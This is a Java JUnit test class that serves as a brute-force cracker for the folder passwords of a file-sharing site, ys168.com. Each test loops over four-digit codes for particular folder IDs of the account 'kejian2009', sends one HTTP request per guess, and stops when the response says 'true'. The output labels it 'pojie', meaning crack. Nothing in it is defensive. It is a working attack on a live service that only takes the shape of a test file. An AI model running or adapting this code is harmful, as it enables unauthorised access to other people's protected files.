import com.alibaba.fastjson.JSON;
import com.lzc.http.HttpRequestUtil;
import org.junit.Test;

import java.util.Map;

public class HttpRequestUtilTest {
    int endpass=7850;
    private String url2="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767069&kqmm=7845&yzm=&_dlmc=kejian2009&_dlmm=";
    private String url3="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767071&kqmm=55&yzm=&_dlmc=kejian2009&_dlmm=";
    private String url4="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767104&kqmm=12&yzm=&_dlmc=kejian2009&_dlmm=";

    @Test
    public void testGetRequestCycle()
    {
        for (int startpass=7843; startpass<7850;startpass++)
        {
            url2="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767069&kqmm="+startpass+"&yzm=&_dlmc=kejian2009&_dlmm=";
            String json = HttpRequestUtil.getRequest(url2);

            try
            {
                System.out.println("startpass:"+startpass);
                Thread.sleep(10);
            }
            catch (Exception e)
            {

            }

            if(json!=null&&json.contains("true")) {
                System.out.println("pojiepojiepojie,result:" + json);
                Thread.yield();
                return;
            }
        }

    }

    @Test
    public void testGetRequestCycle3()
    {
        for (int startpass=1000; startpass<10000;startpass++)
        {
            url3="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767071&kqmm="+startpass+"&yzm=&_dlmc=kejian2009&_dlmm=";
            String json = HttpRequestUtil.getRequest(url3);

            try
            {
                System.out.println("startpass:"+startpass);
                System.out.println("pojiepojiepojie,result:" + json);

                Thread.sleep(10);
            }
            catch (Exception e)
            {

            }

//            if(json!=null&&(json.contains("true")||json.contains("0"))) {
            if(json!=null&&json.contains("true")) {
                Thread.yield();
                return;
            }
        }

    }

    @Test
    public void testGetRequestCycle4()
    {
        for (int startpass=1000; startpass<10000;startpass++)
        {
            url4="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767104&kqmm="+startpass+"&yzm=&_dlmc=kejian2009&_dlmm=";
            String json = HttpRequestUtil.getRequest(url4);

            try
            {
                System.out.println("startpass:"+startpass);
                System.out.println("pojiepojiepojie,result:" + json);
                Thread.sleep(10);
            }
            catch (Exception e)
            {

            }

//            if(json!=null&&(json.contains("true")||json.contains("0"))) {
            if(json!=null&&json.contains("true")) {
                Thread.yield();
                return;
            }
        }

    }

    @Test
    public void testGetRequest()
    {
        url2="http://ca.ys168.com/f_ht/ajcx/mlrz.aspx?cz=Kqmmpd&mlbh=1767069&kqmm="+endpass+"&yzm=&_dlmc=kejian2009&_dlmm=";
        String json = HttpRequestUtil.getRequest(url2);
        if(json!=null&&json.contains("true")) {
            System.out.println("pojiepojiepojie,result:" + json);
            Thread.yield();
            return;
        }

    }


}
